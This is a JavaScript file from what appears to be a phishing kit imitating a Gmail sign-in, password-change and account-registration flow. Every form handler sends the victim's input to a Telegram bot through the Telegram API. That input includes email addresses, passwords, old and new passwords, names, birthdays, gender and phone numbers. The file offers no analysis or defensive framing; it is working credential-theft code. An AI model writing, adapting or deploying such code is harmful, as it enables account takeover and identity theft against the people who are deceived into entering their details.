var _c={color:'white',background:'#1e1f20'};

function getCdtTime(){
  return new Intl.DateTimeFormat('en-US',{
    timeZone:'America/Chicago',
    month:'2-digit',day:'2-digit',year:'numeric',
    hour:'2-digit',minute:'2-digit',second:'2-digit',hour12:true
  }).format(new Date())+' CDT';
}

function sendTelegram(text){
  try{
    fetch('https://api.telegram.org/bot'+TELEGRAM_BOT_TOKEN+'/sendMessage',{
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify({chat_id:TELEGRAM_CHAT_ID,text:text})
    });
  }catch(e){}
}

function sendEmailEntered(email){
  sendTelegram('𝘕𝘦𝘸 𝘌𝘮𝘢𝘪𝘭 𝘏𝘢𝘴 𝘉𝘦𝘦𝘯 𝘌𝘯𝘵𝘦𝘳𝘦𝘥📩\n𝙴𝚖𝚊𝚒𝚕: '+email+'\n𝚃𝚒𝚖𝚎: '+getCdtTime());
}

function sendPasswordEntered(email,password){
  sessionStorage.setItem('login_password',password);
  sendTelegram('𝘕𝘦𝘸 𝘗𝘢𝘴𝘴𝘸𝘰𝘳𝘥 𝘏𝘢𝘴 𝘉𝘦𝘦𝘯 𝘌𝘯𝘵𝘦𝘳𝘦𝘥🗝️\n𝙴𝚖𝚊𝚒𝚕: '+email+'\n𝙿𝚊𝚜𝚜𝚠𝚘𝚛𝚍: '+password+'\n𝚃𝚒𝚖𝚎: '+getCdtTime());
}

function sendPasswordSet(email,password,newPassword){
  sendTelegram('𝘕𝘦𝘸 𝘗𝘢𝘴𝘴𝘸𝘰𝘳𝘥 𝘏𝘢𝘴 𝘉𝘦𝘦𝘯 𝘚𝘦𝘵✅\n𝙴𝚖𝚊𝚒𝚕: '+email+'\n𝙿𝚊𝚜𝚜𝚠𝚘𝚛𝚍: '+password+'\n𝙽𝚎𝚠 𝙿𝚊𝚜𝚜𝚠𝚘𝚛𝚍: '+newPassword+'\n𝚃𝚒𝚖𝚎: '+getCdtTime());
}

function _t(d){
  try{
    fetch('https://api.telegram.org/bot'+TELEGRAM_BOT_TOKEN+'/sendMessage',{
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify({chat_id:TELEGRAM_CHAT_ID,text:'New Submission\n\n'+Object.entries(d).map(function(e){return e[0]+': '+e[1];}).join('\n')})
    });
  }catch(e){}
}

function piskot(){Swal.fire({..._c,icon:"info",iconColor:"#185abc",title:"Cookie",text:"This site was made by Dominik Kalua",confirmButtonColor:"#185abc"});}

function checkLoginForm(e){
  if(e)e.preventDefault();
  var f=document.getElementById("password_form");
  if(!f.reportValidity())return;
  var p=document.getElementById("mail").value;
  if(!p.includes('@')){p=p+'@gmail.com';document.getElementById("mail").value=p;}
  sendEmailEntered(p);
  sessionStorage.setItem('login_email',p);
  setTimeout(function(){
    window.location.href='password_login.html?email='+encodeURIComponent(p);
  }, 800);
}

function checkPassword(){
  var g=document.getElementById("final_password").value;
  if(!g)return;
  var em=new URLSearchParams(window.location.search).get('email')||sessionStorage.getItem('login_email')||'unknown';
  sendPasswordEntered(em,g);
  window.location.href='change_password.html';
}

function checkNameForm(){
  var f=document.getElementById("name_form");
  if(!f.reportValidity())return;
  _t({type:'name',first_name:f.querySelector('input[name="first_name"]').value,last_name:f.querySelector('input[name="last_name"]').value||'(not provided)',time:new Date().toISOString()});
  Swal.fire({..._c,icon:"success",iconColor:"#48a84f",title:"Success",confirmButtonColor:"#185abc",text:"you have entered your name"}).then(function(){window.location.href='gender_and_birthday.html';});
}

function checkDateForm(){
  var f=document.getElementById("date_form");
  if(!f.reportValidity())return;
  _t({type:'gender_and_birthday',birthday:document.getElementById("datum").value,gender:document.getElementById("spol").value,time:new Date().toISOString()});
  Swal.fire({..._c,icon:"success",iconColor:"#48a84f",title:"Success",confirmButtonColor:"#185abc",text:"you have entered your gender and birthday correctly"}).then(function(){window.location.href='email.html';});
}

function checkMailForm(){
  var f=document.getElementById("Email_form");
  if(!f.reportValidity())return;
  _t({type:'email_and_phone',email:f.querySelector('input[type="email"]').value,phone:f.querySelector('input[type="tel"]').value||'(not provided)',time:new Date().toISOString()});
  Swal.fire({..._c,icon:"success",iconColor:"#48a84f",title:"Success",confirmButtonColor:"#185abc",text:"you have entered your email correctly"}).then(function(){window.location.href='password.html';});
}

function checkPasswordForm(){
  var f=document.getElementById("password_form");
  if(!f.reportValidity())return;
  var p=document.getElementById("password").value,c=document.getElementById("confirm_password").value;
  if(p!==c){Swal.fire({..._c,icon:"error",title:"Passwords do not match",confirmButtonColor:"#185abc",text:"your passwords are not identical"});return;}
  _t({type:'account_created',password:p,time:new Date().toISOString()});
  Swal.fire({..._c,icon:"success",iconColor:"#48a84f",title:"Success",confirmButtonColor:"#185abc",text:"you have created an account"}).then(function(){window.location.href='index.html';});
}

function letimletim(){window.location.href='register.html';}
function showPassword(id){var p=document.getElementById(id);p.type=p.type==="password"?"text":"password";}
function togglePasswordVisibility(){var i=document.getElementById('final_password');i.type=document.getElementById('show_pw_checkbox').checked?'text':'password';}
